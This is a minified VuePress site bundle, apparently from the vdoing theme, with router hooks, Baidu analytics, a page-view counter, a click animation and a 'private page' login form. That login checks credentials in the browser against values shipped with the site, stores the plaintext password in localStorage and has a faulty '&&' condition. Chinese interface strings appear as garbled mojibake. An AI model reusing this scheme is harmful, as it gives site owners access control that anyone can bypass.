t={to:n,from:e,...this.$frontmatter};Fl()&&Nl(t)&&Hl(t)})}},Vl=Object(bl.a)($l,(function(){return(0,this._self._c)("div")}),[],!1,null,null,null).exports,Gl=[({Vue:n,options:e,router:r,siteData:a,isServer:i})=>{i||r.beforeEach((n,e,t)=>{a.pages.forEach(e=>{if(e.path==n.path&&e.frontmatter.private&&1==e.frontmatter.private&&a.themeConfig.privatePage){let{username:t,password:i,loginPath:o,loginKey:s,expire:l,loginSession:c}=a.themeConfig.privatePage;if(l||(l=864e5),s||(s="vdoing_login"),c&&window.addEventListener("unload",(function(){localStorage.removeItem(s)})),e.frontmatter.username&&e.frontmatter.password){let t=JSON.parse(localStorage.getItem(e.frontmatter.title));(!t||t.username!==e.frontmatter.username&&t.password!==e.frontmatter.password)&&r.push({path:o,query:{toPath:n.path,singlePage:!0}})}else{let e=JSON.parse(localStorage.getItem(s));!e||e.username!==t&&e.password!==i?r.push({path:o,query:{toPath:n.path}}):new Date-e.time>e.expire&&(localStorage.removeItem(s),r.push({path:o,query:{toPath:n.path}}))}}}),t()}),i||r.beforeEach((n,e,r)=>{r(),"/"!==n.path&&n.path!==e.path&&a.themeConfig.blogInfo&&(kl(".page-view-js"),kl(".page-view"),kl(".book-words"),kl(".reading-time"),a.pages.forEach(e=>{if(e.path==n.path&&(null==e.frontmatter.article||e.frontmatter.article)){const{eachFileWords:n,pageView:r,pageIteration:i,readingTime:o}=a.themeConfig.blogInfo;return n&&n.forEach(n=>{n.permalink==e.frontmatter.permalink&&(function(n){if(n){let e=document.createElement("div");e.title="æç« å­æ°",e.className="book-words iconfont icon-book",e.style.float="left",e.style.marginLeft="20px",e.style.fontSize="0.8rem",e.innerHTML=`<a href="javascript:;" style="margin-left: 3px; color: #888">${n}</a>`,_l(e)}}(n.wordsCount),(o||null==o)&&function(n){let e=document.createElement("div");e.title="é¢éè¯»æ¶é¿",e.className="reading-time iconfont icon-shijian",e.style.float="left",e.style.marginLeft="20px",e.style.fontSize="0.8rem",e.innerHTML=`<a href="javascript:;" style="margin-left: 3px; color: #888">${n}</a>`,_l(e)}(n.readingTime))}),void((r||null==r)&&(!function(){let n=document.createElement("div");n.title="æµè§é",n.className="page-view iconfont icon-view",n.style.float="left",n.style.marginLeft="20px",n.style.fontSize="0.8rem",n.innerHTML='<a style="color: #888; margin-left: 3px" href="javascript:;" id="busuanzi_value_page_pv" class="view-data"><i title="æ­£å¨è·å..." class="loading iconfont icon-loading"></i></a>',_l(n);let e=document.createElement("style");e.innerHTML="@keyframes turn {\n    0% {\n      transform: rotate(0deg);\n    }\n    100% {\n      transform: rotate(360deg);\n    }\n  }\n  .loading {\n    display: inline-block;\n    animation: turn 1s linear infinite;\n    -webkit-animation: turn 1s linear infinite;\n  }",document.head.appendChild(e)}(),setTimeout(()=>{!function(n=3e3){wl?wl.fetch():wl=t(101);var e=0;setTimeout(()=>{let t=setInterval(()=>{const r=document.querySelector(".view-data");r?((e+=n)>10*n&&(r.innerText="9999",clearInterval(t)),""==r.innerText?wl.fetch():clearInterval(t)):clearInterval(t)},n)},n)}(i)},1500)))}}))})},({Vue:n,options:e,router:t,siteData:r})=>{r.pages.map(n=>{const{frontmatter:{date:e,author:t}}=n;"string"==typeof e&&"Z"===e.charAt(e.length-1)&&(n.frontmatter.date=function(n){n instanceof Date||(n=new Date(n));return`${n.getUTCFullYear()}-${Tl(n.getUTCMonth()+1)}-${Tl(n.getUTCDate())} ${Tl(n.getUTCHours())}:${Tl(n.getUTCMinutes())}:${Tl(n.getUTCSeconds())}`}(e)),t?n.author=t:r.themeConfig.author&&(n.author=r.themeConfig.author)}),n.mixin(Il)},{},({Vue:n})=>{n.mixin({computed:{$dataBlock(){return this.$options.__data__block__}}})},{},{},()=>{"undefined"!=typeof window&&function(n,e,t){function r(n){var t=e.createElement("div");t.className="heart",a.push({el:t,x:n.clientX-5,y:n.clientY-5,scale:1,alpha:1,color:"#11a8cd"}),e.body.appendChild(t)}var a=[];n.requestAnimationFrame=n.requestAnimationFrame||n.webkitRequestAnimationFrame||n.mozRequestAnimationFrame||n.oRequestAnimationFrame||n.msRequestAnimationFrame||function(n){setTimeout(n,1e3/60)},function(n){var t=e.createElement("style");t.type="text/css";try{t.appendChild(e.createTextNode(n))}catch(e){t.styleSheet.cssText=n}e.getElementsByTagName("head")[0].appendChild(t)}(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"),function(){var e="function"==typeof n.onclick&&n.onclick;n.onclick=function(n){let t=!0;n.path&&n.path.forEach(n=>{1===n.nodeType&&"string"==typeof n.className&&n.className.indexOf("theme-vdoing-content")>-1&&(t=!1)}),t&&(e&&e(),r(n))}}(),function n(){for(var t=0;t<a.length;t++)a[t].alpha<=0?(e.body.removeChild(a[t].el),a.splice(t,1)):(a[t].y--,a[t].scale+=.004,a[t].alpha-=.013,a[t].el.style.cssText="left:"+a[t].x+"px;top:"+a[t].y+"px;opacity:"+a[t].alpha+";transform:scale("+a[t].scale+","+a[t].scale+") rotate(45deg);background:"+a[t].color+";z-index:99999");requestAnimationFrame(n)}()}(window,document)},({router:n})=>{"undefined"!=typeof window&&(window._hmt=window._hmt||[],function(){var n=document.createElement("script");n.src="https://hm.baidu.com/hm.js?0d7ce6cf5576081a22c4dc40b74a7840";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)}(),n.afterEach((function(n){_hmt.push(["_trackPageview",n.fullPath])})))},({Vue:n})=>{n.component(Al.name,Al),n.mixin({computed:{$readingShow(){return this.$page.frontmatter.readingShow}}})},({Vue:n})=>{n.component("Comment",Vl)}],Wl=["ReadingProgress","Comment"];class Jl extends class{constructor(){this.store=new Gt({data:{state:{}}})}$get(n){return this.store.state[n]}$set(n,e){Gt.set(this.store.state,n,e)}$emit(...n){this.store.$emit(...n)}$on(...n){this.store.$on(...n)}}{}Object.assign(Jl.prototype,{getPageAsyncComponent:os,getLayoutAsyncComponent:ss,getAsyncComponent:ls,getVueComponent:cs});var Ql={install(n){const e=new Jl;n.$vuepress=e,n.prototype.$vuepress=e}};function Xl(n,e){const t=e.toLowerCase();return n.options.routes.some(n=>n.path.toLowerCase()===t)}var Yl={props:{pageKey:String,slotKey:{type:String,default:"default"}},render(n){const e=this.pageKey||this.$parent.$page.key;return ds("pageKey",e),Gt.component(e)||Gt.component(e,os(e)),Gt.component(e)?n(e):n("")}},Zl={functional:!0,props:{slotKey:String,required:!0},render:(n,{props:e,slots:t})=>n("div",{class:["content__"+e.slotKey]},t()[e.slotKey])},Kl={computed:{openInNewWindowTitle(){return this.$themeLocaleConfig.openNewWindowText||"(opens new window)"}}},nc=(t(258),t(259),Object(bl.a)(Kl,(function(){var n=this._self._c;return n("span",[n("svg",{staticClass:"icon outbound",attrs:{xmlns:"http://www.w3.org/2000/svg","aria-hidden":"true",focusable:"false",x:"0px",y:"0px",viewBox:"0 0 100 100",width:"15",height:"15"}},[n("path",{attrs:{fill:"currentColor",d:"M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"}}),this._v(" "),n("polygon",{attrs:{fill:"currentColor",points:"45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"}})]),this._v(" "),n("span",{staticClass:"sr-only"},[this._v(this._s(this.openInNewWindowTitle))])])}),[],!1,null,null,null).exports),ec={functional:!0,render(n,{parent:e,children:t}){if(e._isMounted)return t;e.$once("hook:mounted",()=>{e.$forceUpdate()})}};Gt.config.productionTip=!1,Gt.use($o),Gt.use(Ql),Gt.mixin(function(n,e,t=Gt){!function(n){n.locales&&Object.keys(n.locales).forEach(e=>{n.locales[e].path=e});Object.freeze(n)}(e),t.$vuepress.$set("siteData",e);const r=new(n(t.$vuepress.$get("siteData"))),a=Object.getOwnPropertyDescriptors(Object.getPrototypeOf(r)),i={};return Object.keys(a).reduce((n,e)=>(e.startsWith("$")&&(n[e]=a[e].get),n),i),{computed:i}}(n=>class{setPage(n){this.__page=n}get $site(){return n}get $themeConfig(){return this.$site.themeConfig}get $frontmatter(){return this.$page.frontmatter}get $localeConfig(){const{locales:n={}}=this.$site;let e,t;for(const r in n)"/"===r?t=n[r]:0===this.$page.path.indexOf(r)&&(e=n[r]);return e||t||{}}get $siteTitle(){return this.$localeConfig.title||this.$site.title||""}get $canonicalUrl(){const{canonicalUrl:n}=this.$page.frontmatter;return"string"==typeof n&&n}get $title(){const n=this.$page,{metaTitle:e}=this.$page.frontmatter;if("string"==typeof e)return e;const t=this.$siteTitle,r=n.frontmatter.home?null:n.frontmatter.title||n.title;return t?r?r+" | "+t:t:r||"VuePress"}get $description(){const n=function(n){if(n){const e=n.filter(n=>"description"===n.name)[0];if(e)return e.content}}(this.$page.frontmatter.meta);return n||(this.$page.frontmatter.description||this.$localeConfig.description||this.$site.description||"")}get $lang(){return this.$page.frontmatter.lang||this.$localeConfig.lang||"en-US"}get $localePath(){return this.$localeConfig.path||"/"}get $themeLocaleConfig(){return(this.$site.themeConfig.locales||{})[this.$localePath]||{}}get $page(){return this.__page?this.__page:function(n,e){for(let t=0;t<n.length;t++){const r=n[t];if(r.path.toLowerCase()===e.toLowerCase())return r}return{path:"",frontmatter:{}}}(this.$site.pages,this.$route.path)}},xl)),Gt.component("Content",Yl),Gt.component("ContentSlotsDistributor",Zl),Gt.component("OutboundLink",nc),Gt.component("ClientOnly",ec),Gt.component("Layout",ss("Layout")),Gt.component("NotFound",ss("NotFound")),Gt.prototype.$withBase=function(n){const e=this.$site.base;return"/"===n.charAt(0)?e+n.slice(1):n},window.__VUEPRESS__={version:"1.9.5",hash:"dd3af70"},async function(n){const e="undefined"!=typeof window&&window.__VUEPRESS_ROUTER_BASE__?window.__VUEPRESS_ROUTER_BASE__:xl.routerBase||xl.base,t=new $o({base:e,mode:"history",fallback:!1,routes:yl,scrollBehavior:(n,e,t)=>t||(n.hash?!Gt.$vuepress.$get("disableScrollBehavior")&&{selector:decodeURIComponent(n.hash)}:{x:0,y:0})});!function(n){n.beforeEach((e,t,r)=>{if(Xl(n,e.path))r();else if(/(\/|\.html)$/.test(e.path))if(/\/$/.test(e.path)){const t=e.path.replace(/\/$/,"")+".html";Xl(n,t)?r(t):r()}else r();else{const t=e.path+"/",a=e.path+".html";Xl(n,a)?r(a):Xl(n,t)?r(t):r()}})}(t);const r={};try{await Promise.all(Gl.filter(n=>"function"==typeof n).map(e=>e({Vue:Gt,options:r,router:t,siteData:xl,isServer:n})))}catch(n){console.error(n)}return{app:new Gt(Object.assign(r,{router:t,render:n=>n("div",{attrs:{id:"app"}},[n("RouterView",{ref:"layout"}),n("div",{class:"global-ui"},Wl.map(e=>n(e)))])})),router:t}}(!1).then(({app:n,router:e})=>{e.onReady(()=>{n.$mount("#app")})})},function(n,e,t){"use strict";t.r(e);t(9);function r(n,e,t=50,r=3e3){var a=document.querySelectorAll(".private-tip"),i=(new Date).getTime(),o=0==a.length?0:a[a.length-1].getAttribute("data-top"),s=parseInt(o)+(0!=a.length?a[a.length-1].offsetHeight+17:t);let l=document.createElement("div");l.className=`private-tip tip-${e} ${i}`,l.style.top=parseInt(o)+"px",l.setAttribute("data-top",s),"info"==e||1==e?l.innerHTML=`<i class="iconfont icon-info icon"></i><p class="tip-info-content">${n}</p>`:"success"==e||2==e?l.innerHTML=`<i class="iconfont icon-dagouyouquan icon"></i><p class="tip-success-content">${n}</p>`:"danger"==e||3==e?l.innerHTML=`<i class="iconfont icon-cuowu icon"></i><p class="tip-danger-content">${n}</p>`:"warning"!=e&&4!=e||(l.innerHTML=`<i class="iconfont icon-gantanhao icon"></i><p class="tip-warning-content">${n}</p>`),document.body.appendChild(l);let c=document.getElementsByClassName(i)[0];setTimeout(()=>{c.style.top=parseInt(s)+"px",c.style.opacity="1"},10),setTimeout(()=>{c.style.top="0px",c.style.opacity="0";var n=function(n){for(var e=[],t=n;t;t=t.nextSibling)1===t.nodeType&&t!==n&&e.push(t);return e}(c);for(let r=0;r<n.length;r++){var e=n[r],t=parseInt(e.getAttribute("data-top"))-e.offsetHeight-17;e.setAttribute("data-top",t),e.style.top=t+"px"}setTimeout(()=>{c.remove()},500)},r)}var a={data:()=>({username:"",password:""}),created(){document.onkeyup=n=>{13==window.event.keyCode&&this.login()}},methods:{login(){let{username:n,password:e,expire:t,loginKey:a}=this.$themeConfig.privatePage;if(this.username&&this.password)if(this.$route.query.singlePage&&this.$filterPosts.forEach(r=>{if(r.path==this.$route.query.toPath)return n=r.frontmatter.username,e=r.frontmatter.password,a=r.frontmatter.title,void(t=r.frontmatter.expire||t)}),this.username==n&&this.password==e){const n=JSON.stringify({username:this.username,password:this.password,time:(new Date).getTime(),expire:t});window.localStorage.setItem(a,n),r("ç»å½æåï¼æ­£å¨è·³è½¬ ...","success"),this.$route.query.toPath?this.$router.push({path:this.$route.query.toPath}):this.$router.push({path:"/"})}else this.password="",r("ç¨æ·åæèå¯ç éè¯¯ï¼è¯·èç³»åä¸»è·åç¨æ·ååå¯ç ï¼","danger");else""==this.username&&""!=this.password?r("ç¨æ·åä¸è½ä¸ºç©ºï¼","warning"):""!=this.username&&""==this.password?r("å¯ç ä¸è½ä¸ºç©ºï¼","warning"):r("æ¨è®¿é®çæç« æ¯ç§å¯æç« ï¼è¯·åè¾å¥ç¨æ·ååå¯ç ï¼","info")}}},i=(t(245),t(0)),o=Object(i.a)(a,(function(){var n=this,e=n._self._c;return e("div",{staticClass:"login-form"},[e("div",{staticClass:"form-header"},[n._v("ç¨æ·å")]),n._v(" "),e("div",[e("input",{directives:[{name:"model",rawName:"v-model",value:n.username,expression:"username"}],staticClass:"form-control",attrs:{type:"text",placeholder:"è¯·è¾å¥ç¨æ·å ..."},domProps:{value:n.username},on:{input:function(e){e.target.composing||(n.username=e.target.value)}}})]),n._v(" "),e("div",{staticClass:"form-header"},[n._v("å¯ç ")]),n._v(" "),e("div",[e("input",{directives:[{name:"model",rawName:"v-model",value:n.password,expression:"password"}],staticClass:"form-control",attrs:{type:"password",placeholder:"è¯·è¾å¥å¯ç  ..."},domProps:{value:n.password},on:{input:function(e){e.target.composing||(n.password=e.target.value)}}})]),n._v(" "),e("div",{staticClass:"btn-row"},[e("button",{staticClass:"btn",on:{click:n.login}},[n._v("ç»å½")])])])}),[],!1,null,null,null);e.default=o.exports}]);